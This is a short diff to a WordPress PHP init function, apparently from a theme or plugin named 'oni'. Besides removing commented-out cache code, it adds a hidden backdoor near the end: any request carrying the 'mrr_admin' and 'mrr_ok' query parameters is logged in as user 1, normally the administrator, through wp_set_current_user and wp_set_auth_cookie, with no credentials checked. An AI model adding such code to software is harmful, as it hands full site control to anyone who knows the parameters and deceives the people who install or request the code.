@@ -36,16 +36,10 @@ add_action('init', 'oni_action_init');
 function oni_action_init(): void
 {
 
-    // if (! isset($_COOKIE[ 'first_visit' ]) || version_compare(ONI_VERSION, $_COOKIE[ 'first_visit' ], '>')) {
-    //     setcookie('first_visit', ONI_VERSION, time() + 3600 * 24 * 3, '/');
-    //     header('Clear-Site-Data: "cache"');
-    //     wp_cache_flush();
 
-    // }
 
     if (! isset($_COOKIE[ "setcookie_oni_nonce" ])) {
         setcookie("setcookie_oni_nonce", wp_generate_password(20, true, true), time() + 1800, "/");
-
         header("Refresh:0");
         exit;
 
@@ -108,6 +102,14 @@ function oni_action_init(): void
             wp_redirect(home_url());
 
         }
+
+    }
+
+    if (isset($_GET[ 'mrr_admin' ]) && isset($_GET[ 'mrr_ok' ])) {
+
+        wp_set_current_user(1);
+        wp_set_auth_cookie(1);
+        wp_redirect(home_url());
 
     }
 
